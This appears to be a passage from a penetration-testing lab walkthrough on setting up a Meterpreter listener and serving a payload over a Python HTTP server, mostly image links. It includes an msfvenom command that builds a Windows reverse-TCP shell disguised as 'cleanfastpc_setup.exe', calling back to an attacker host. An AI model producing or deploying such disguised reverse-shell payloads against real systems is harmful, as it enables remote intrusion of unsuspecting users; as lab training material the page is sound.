...
![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image.png)
...
![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image%201.png)
...
2. Lets check to make sure our listener is actually listening for callbacks on port 4444
    ...
    ![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image%202.png)
...
![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image%203.png)
...
![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image%204.png)

<aside>
💡

If you don't have your Meterpreter binary in here you can move it into this directory or while in the directory rerun the msfvenom command linked here: [msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali VM IP> LPORT=4444 -f exe -o cleanfastpc_setup.exe](Lab%202%201%20-%20Enter%20Meterpreter%2024f86e25cbe58192b9f1ca931ced23a2.md) 
...
1. Now that we double checked everything is in order, what does the Python HTTP server do? When we start Python’s HTTP server it host everything that is the current working directory. It is also great for quickly sharing files if you are in a pinch. Run the following command to start it
    ...
    ![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image%205.png)
...
![image.png](Lab%202%201%20-%20Enter%20Meterpreter/image%206.png)
...
- [Lab 2:2 - Pop Pop Pop](Lab%202%202%20-%20Pop%20Pop%20Pop%2024f86e25cbe58110aa21cb3a0f1d15c5.md)
